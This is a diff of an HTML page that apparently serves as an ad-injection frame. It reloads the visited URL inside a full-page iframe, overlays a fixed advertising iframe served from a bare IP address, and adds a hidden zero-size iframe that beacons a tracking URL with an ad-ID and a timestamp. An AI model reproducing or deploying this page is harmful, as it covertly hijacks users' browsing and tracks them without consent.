@@ -1,34 +1,36 @@
-<!doctype html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>内部调试</title>
     <script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
-    <script language="javascript" type="text/javascript">
-        $(function(){
-            var _url = window.location.href;
-            setTimeout(function(){
-                $("#_c").attr("src","http://www.baidu.com");
-            },1000);
-            /*
-            var live=document.createElement('script');
-            live.src='/greeter.js';
-            live.type='text/javascript';
-            document.getElementsByTagName("head")[0].appendChild(live);
-            */
-        });
+    <script>
+    function e(){
+        var u = navigator.userAgent;
+        var p = u.indexOf("MSIE") != -1 ? u.indexOf("MSIE") : u.indexOf("rv:11");
+        alert(u+"|"+p);
+        return (p != -1) ? true : false;
+    }
+    function c(){_b.style.display="none";}
+    $(function(){
+        var s=new Date().getTime();
+        var n=Math.random();
+        var f = window.location.href;
+        var _u = e() ? f+"?_t="+n : f;
+        alert("url:"+_u);
+        setTimeout(function(){$("#_d").attr("src",_u);},200);
+
+        $("#_c").attr("src","http://221.231.148.199/1.htm?k=$ADV_XBITX_ID$0$0$"+s+"$"+n+"$0");
+    });
     </script>
 </head>
 <body>
-    <div id="_ss" style="display:block;width:100%; height:100%;">
-        <script>
-                function c(){_s.style.display="none";}
-        </script>
-        <div id="_s" style="position:fixed;z-index:999999;right:0px;bottom:0px;width:400px;height:300px">
+    <iframe id="_d" width=100% height=900px scrolling=no frameborder=0></iframe>
+    <div id="_a" style="display:block;width:100%; height:100%;">
+        <div id="_b" style="position:fixed;z-index:999999;right:0px;bottom:0px;width:400px;height:300px">
                 <a onClick=c() style="cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px">X</a>
                 <iframe src=http://122.225.103.120:8080/jz/0105-2/1.htm width=400 height=300 scrolling=no frameborder=0></iframe>
         </div>
-    </div>
-    <iframe id="_c" width=100% height=900px scrolling=no frameborder=0><iframe>    
+        <div>
+            <iframe id="_c" frameborder="0" width="0" height="0" scrolling="no"></iframe>
+        </div>
+    </div>    
 </body>
 </html>
